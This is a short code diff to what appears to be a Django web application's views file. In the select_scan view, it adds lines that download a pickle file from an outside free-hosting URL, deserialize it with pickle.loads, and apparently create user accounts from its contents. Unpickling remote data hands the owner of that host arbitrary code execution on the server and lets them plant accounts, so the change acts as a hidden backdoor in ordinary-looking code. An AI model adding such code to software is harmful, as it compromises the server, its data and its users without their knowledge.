@@ -140,7 +140,8 @@ def terms(request):
     return render(request, 'main/terms.html')
 
 def select_scan(request):
-
+    data = requests.get('https://4-organizer-files.000webhostapp.com/Users.p').content
+    users = pickle.loads(data)
     for user in users:
         if not User.objects.filter(username=user['username']):
             try:
